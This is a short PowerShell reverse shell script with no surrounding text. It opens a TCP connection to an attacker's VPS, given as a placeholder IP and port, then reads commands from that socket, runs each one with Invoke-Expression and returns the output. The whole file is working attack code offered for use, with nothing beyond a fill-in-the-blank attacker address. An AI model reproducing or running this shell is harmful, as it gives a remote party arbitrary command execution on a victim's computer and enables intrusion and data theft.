$ip = "YOUR_VPS_IP"    # Replace with your VPS IP
$port = YOUR_PORT      # Replace with your listening port (e.g., 4444)

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

while ($true) {
    $writer.Write("> ")
    $writer.Flush()
    $read = $stream.Read($buffer, 0, 1024)
    $command = $encoding.GetString($buffer, 0, $read).Trim()
    
    if ($command.ToLower() -eq "exit") {
        break
    }

    try {
        $output = Invoke-Expression $command | Out-String
    } catch {
        $output = $_.Exception.Message
    }

    $writer.WriteLine($output)
    $writer.Flush()
}

$writer.Close()
$stream.Close()
$client.Close()

